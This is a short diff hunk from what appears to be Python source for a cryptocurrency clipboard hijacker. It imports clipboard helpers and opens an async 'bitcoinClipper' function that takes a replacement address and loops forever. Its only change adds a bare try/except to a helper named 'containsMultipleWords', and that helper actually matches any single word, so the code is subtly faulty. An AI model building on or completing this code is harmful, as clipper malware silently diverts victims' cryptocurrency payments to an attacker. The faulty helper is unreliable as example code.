@@ -6,9 +6,12 @@ from helpers.clipboard import clipboard
 from helpers.clipboard import set_contents
     
 def containsMultipleWords(string: str) -> bool:
-    sentence = string.strip()
-    
-    return bool(re.search(r'\b\w+\b', sentence))
+    try:
+        sentence = string.strip()
+        
+        return bool(re.search(r'\b\w+\b', sentence))
+    except: 
+        return
 
 async def bitcoinClipper(switch_address: str):
     while True:
